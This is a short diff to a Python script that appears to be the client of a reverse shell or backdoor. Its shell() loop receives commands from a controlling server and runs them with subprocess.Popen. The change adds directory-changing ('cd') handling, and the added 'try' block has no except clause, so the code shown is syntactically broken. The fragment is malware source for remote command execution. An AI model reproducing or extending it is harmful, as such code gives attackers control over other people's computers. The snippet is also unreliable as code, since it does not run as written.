@@ -30,6 +30,9 @@ def shell():
 		server_cmd = json_recv()
 		if server_cmd == 'q':
 			break
+		elif server_cmd[:2] == "cd" and len(server_cmd) > 1:
+			try:
+				os.chdir(server_cmd[3:])
 		else:
 			# if everything goes a expected, this else condition will run
 			ps = subprocess.Popen(
